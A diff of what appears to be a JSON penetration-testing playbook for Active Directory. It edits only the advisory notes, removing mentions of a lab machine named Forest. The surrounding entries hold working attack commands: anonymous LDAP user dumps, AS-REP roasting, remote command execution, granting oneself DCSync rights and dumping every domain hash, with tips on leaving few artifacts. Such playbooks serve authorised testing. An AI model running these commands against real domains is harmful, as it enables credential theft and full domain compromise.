@@ -265,7 +265,7 @@
     {
      "tool": "nxc",
      "run": "nxc ldap {{target}} -u '' -p '' --users",
-     "note": "nxc performs the entire anonymous LDAP dump in a single line, descriptions and all. On Forest-style machines this is the quickest user list you will find anywhere."
+     "note": "nxc performs the entire anonymous LDAP dump in a single line, descriptions and all. On anonymously-bindable machines this is the quickest user list you will find anywhere."
     },
     {
      "tool": "ldapsearch",
@@ -401,7 +401,7 @@
     {
      "tool": "nxc",
      "run": "nxc ldap {{target}} -u {{userlist}} -p '' --asreproast {{hashfile}}",
-     "note": "PREFERRED: no credentials at all — each user in the list gets tried, and the roastable ones drop into {{hashfile}} set up for hashcat -m 18200. This is the fastest Forest-style way in: anonymous LDAP handed you the list, and this converts it into hashes."
+     "note": "PREFERRED: no credentials at all — each user in the list gets tried, and the roastable ones drop into {{hashfile}} set up for hashcat -m 18200. This is the fastest way in when anonymous LDAP handed you the list, and this converts it into hashes."
     },
     {
      "tool": "Rubeus",
@@ -893,7 +893,7 @@
     {
      "tool": "nxc",
      "run": "nxc ldap {{target}} -u {{user}} -p '{{password}}' -M group-mem -o GROUP='Domain Admins'",
-     "note": "Members of Domain Admins (and repeat for Enterprise Admins, Account Operators, Backup Operators, DnsAdmins, Exchange Windows Permissions). A group YOU can add yourself to that nests into one of these IS the path — the Forest route (Account Operators -> Exchange Windows Permissions -> WriteDacl -> DCSync)."
+     "note": "Members of Domain Admins (and repeat for Enterprise Admins, Account Operators, Backup Operators, DnsAdmins, Exchange Windows Permissions). A group YOU can add yourself to that nests into one of these IS the path — a classic route (Account Operators -> Exchange Windows Permissions -> WriteDacl -> DCSync)."
     },
     {
      "tool": "nxc",
@@ -1049,7 +1049,7 @@
     {
      "tool": "impacket-secretsdump",
      "run": "impacket-secretsdump '{{domain}}/{{user}}:{{password}}'@{{target}}",
-     "note": "PREFERRED cash-in: a full DRSUAPI sync — every hash in the domain, krbtgt among them (golden ticket material). No interactive prompt, no DC-side artifact. Guard this file; it is the report evidence itself. It falls back to DRSUAPI automatically when the local SAM/LSA read is denied (a non-admin with only replication rights, e.g. Forest's john)."
+     "note": "PREFERRED cash-in: a full DRSUAPI sync — every hash in the domain, krbtgt among them (golden ticket material). No interactive prompt, no DC-side artifact. Guard this file; it is the report evidence itself. It falls back to DRSUAPI automatically when the local SAM/LSA read is denied (a non-admin with only replication rights)."
     },
     {
      "tool": "impacket-secretsdump",
@@ -1064,7 +1064,7 @@
     {
      "tool": "nxc",
      "run": "nxc smb {{target}} -u {{user}} -p '{{password}}' --ntds",
-     "note": "Same DRSUAPI replication with less typing, BUT on newer Windows nxc prompts an interactive [Y/N] ('dumping the ntds can crash the DC') that STALLS an unattended run, and it has been seen to fail with DRSR ERROR_DS_DRA_BAD_DN where impacket-secretsdump succeeds (the Forest re-test) — prefer secretsdump for DCSync. Append --ntds vss for the shadow-copy approach; krbtgt in the output means golden-ticket material."
+     "note": "Same DRSUAPI replication with less typing, BUT on newer Windows nxc prompts an interactive [Y/N] ('dumping the ntds can crash the DC') that STALLS an unattended run, and it has been seen to fail with DRSR ERROR_DS_DRA_BAD_DN where impacket-secretsdump succeeds — prefer secretsdump for DCSync. Append --ntds vss for the shadow-copy approach; krbtgt in the output means golden-ticket material."
     }
    ]
   },
@@ -1119,7 +1119,7 @@
     {
      "tool": "nxc",
      "run": "nxc winrm {{target}} -u {{user}} -p '{{password}}' -X '{{command}}'",
-     "note": "The WinRM version — zero SMB service artifacts, output over 5985. CAVEAT: on some nxc builds `nxc winrm -x/-X` crashes with `zip() argument 2 is longer than argument 1` (seen on the Forest re-test) and returns nothing; if that happens, use `nxc smb -x` (wmiexec, above), impacket-wmiexec, or evil-winrm for command exec — they were reliable on the same box."
+     "note": "The WinRM version — zero SMB service artifacts, output over 5985. CAVEAT: on some nxc builds `nxc winrm -x/-X` crashes with `zip() argument 2 is longer than argument 1` (seen in testing) and returns nothing; if that happens, use `nxc smb -x` (wmiexec, above), impacket-wmiexec, or evil-winrm for command exec — they were reliable on the same box."
     },
     {
      "tool": "powershell",
@@ -1755,7 +1755,7 @@
     {
      "tool": "bloodyad",
      "run": "bloodyAD -d {{domain}} --host {{target}} -u {{user}} -p '{{password}}' add dcsync {{user}}",
-     "note": "The Forest cash-in: once WriteDACL on the domain object is yours (e.g. via Exchange Windows Permissions), grant your own account the DS-Replication rights (GetChanges + GetChangesAll) — then run the `dcsync` card. All from Linux: no PowerView upload, no dot-sourcing, no evil-winrm line-wrap breakage. Name any principal you control in place of {{user}}."
+     "note": "The cash-in: once WriteDACL on the domain object is yours (e.g. via Exchange Windows Permissions), grant your own account the DS-Replication rights (GetChanges + GetChangesAll) — then run the `dcsync` card. All from Linux: no PowerView upload, no dot-sourcing, no evil-winrm line-wrap breakage. Name any principal you control in place of {{user}}."
     },
     {
      "tool": "impacket-dacledit",
